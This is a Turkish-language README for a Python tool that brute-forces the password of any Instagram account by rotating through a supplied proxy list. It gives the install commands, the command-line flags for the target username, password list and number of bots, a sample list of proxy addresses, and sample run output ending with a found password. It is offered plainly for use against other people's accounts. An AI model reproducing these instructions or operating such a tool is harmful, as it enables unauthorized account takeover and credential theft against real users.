Instagram Script
Bu program, size gönderilen bir proxy listesi ile herhangi bir Instagram hesabını kaba kuvvet saldırısıyla deneyecektir.

Destek
Bu programı güncellemeye devam etmemi teşvik eder.

Gereksinimler
Python v3.9
proxy listesi
Bağımlılıkları Yükleyin
Pipenv'i Yükleyin
bash
Copy code
pip install pipenv
Çevre oluşturun
Python 3.9'un yüklü olduğundan emin olun

bash
Copy code
pipenv --python 3.9
Gerekli Paketleri Yükleyin
bash
Copy code
pipenv install
Yardım
bash
Copy code
kullanım: instagram.py [-h] [-u KULLANICI ADI] [-p ŞİFRE LİSTESİ] [-px PROXY LİSTESİ] [--prune PRUNE] [--stats] [-nc] [-m MOD]

isteğe bağlı argümanlar:
  -h, --help            bu yardım mesajını göster ve çık
  -u KULLANICI ADI, --username KULLANICI ADI
                        e-posta veya kullanıcı adı
  -p ŞİFRE LİSTESİ, --passlist ŞİFRE LİSTESİ
                        şifre listesi
  -px PROXY LİSTESİ, --proxylist PROXY LİSTESİ
                        proxy listesi
  --prune PRUNE         veritabanını temizle
  --stats               proxy istatistiklerini al
  -nc, --no-color       renkleri devre dışı bırak
  -m MOD, --mode MOD    modlar: 0 => 32 bot; 1 => 16 bot; 2 => 8 bot; 3 => 4 bot
Proksiler
Sistem çalışmak için bir proksi listesine ihtiyaç duyar. Yüklendikten sonra, proxy'ler bir veritabanına kaydedilir.<br/>

Yükle
Proxy listesini programa yükleyin. Proxy dosyasının ip:port formatında olması gerekmektedir.<br/>

proxies_list.txt

makefile
Copy code
3.238.111.248:80
206.189.59.192:8118
165.22.81.30:34100
176.248.120.70:3128
191.242.178.209:3128
180.92.194.235:80
Proxy listesini yüklemek için benzer bir sözdizimini takip etmelisiniz.

bash
Copy code
python instagram.py -px <proksi listesinin yolu>
İstatistikler
Bu, veritabanındaki proxy'lerin durumu hakkında bilgi verir.

bash
Copy code
python instagram.py --stats
Budama
Bu, belirli bir puanın altındaki proxy'leri temizlemenizi sağlar.<br/>
--stats komutunu çalıştırmanız ve veritabanını, proxy'lerin Q1 altındaki puanına sahip olanlardan temizlemeniz önerilir.

bash
Copy code
python instagram.py --prune 0.05
Budama zorunlu değildir çünkü sistem, kötü performans gösteren proxy'leri otomatik olarak öğrenir ve bunları kullanmayı bırakır.

Kullanım
bash
Copy code
python instagram.py -u <kullanıcı adı> -p <şifre listesi>
Çalıştır
bash
Copy code
[-] Şifre Listesi: passlist.txt
[-] Kullanıcı Adı: Anomin123
[-] Şifre: 272
[-] Tamamlandı: 45.51%
[-] Deneme: 228
[-] Tarayıcılar: 273
[-] Var: True
Durdur
bash
Copy code
[-] Şifre Listesi: passlist.txt
[-] Kullanıcı Adı: anomin123
[-] Şifre: 1234
[-] Tamamlandı: 62.67%
[-] Deneme: 314
[-] Tarayıcılar: 185
[-] Var: True

[!] Şifre Bulundu
[+] Kullanıcı Adı: Anomin123
[+] Şifre: 1234